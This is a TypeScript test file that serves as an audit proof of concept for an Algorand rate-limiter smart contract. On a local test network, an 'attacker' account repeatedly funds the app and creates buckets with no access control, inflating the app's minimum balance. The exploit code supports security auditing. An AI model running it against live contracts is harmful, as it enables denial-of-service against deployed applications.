import { algorandFixture } from "@algorandfoundation/algokit-utils/testing";
import type { TransactionSignerAccount } from "@algorandfoundation/algokit-utils/types/account";
import { type Account, type Address, getApplicationAddress } from "algosdk";

import { RateLimiterExposedClient, RateLimiterExposedFactory } from "../../specs/client/RateLimiterExposed.client.ts";
import { getBucketBoxKey } from "../utils/boxes.ts";
import { getRandomBytes } from "../utils/bytes.ts";
import { SECONDS_IN_DAY } from "../utils/time.ts";

/**
 * PoC for audit_001_015_plan_report: demonstrates that without access control
 * an arbitrary account can create multiple buckets, rapidly increasing the
 * application's minimum balance requirement.
 */
describe("RateLimiter DoS PoC - unrestricted bucket creation", () => {
  const localnet = algorandFixture();

  let factory: RateLimiterExposedFactory;
  let client: RateLimiterExposedClient;
  let appId: bigint;

  let creator: Address & Account & TransactionSignerAccount;
  let attacker: Address & Account & TransactionSignerAccount;

  const limit = BigInt(100n * 10n ** 18n);
  const duration = SECONDS_IN_DAY;
  const FUNDING_PER_BUCKET = (154_900).microAlgos();

  beforeAll(async () => {
    await localnet.newScope();
    const { algorand, generateAccount } = localnet.context;

    creator = await generateAccount({ initialFunds: (10).algo() });
    attacker = await generateAccount({ initialFunds: (10).algo() });

    factory = algorand.client.getTypedAppFactory(RateLimiterExposedFactory, {
      defaultSender: creator,
      defaultSigner: creator.signer,
    });

    const { appClient, result } = await factory.deploy();
    appId = result.appId;
    client = appClient;
  });

  test("attacker can create many buckets", async () => {
    const appAddress = getApplicationAddress(appId);

    for (let i = 0; i < 5; i++) {
      const bucketId = getRandomBytes(32);

      const fundingTxn = await localnet.algorand.createTransaction.payment({
        sender: attacker,
        receiver: appAddress,
        amount: FUNDING_PER_BUCKET,
      });

      await client
        .newGroup()
        .addTransaction(fundingTxn)
        .addBucket({
          sender: attacker,
          signer: attacker.signer,
          args: [bucketId, limit, duration],
          boxReferences: [getBucketBoxKey(bucketId)],
        })
        .send();

      const bucket = await client.getBucket({ args: [bucketId] });
      expect(bucket.limit).toEqual(limit);
    }
  });
});
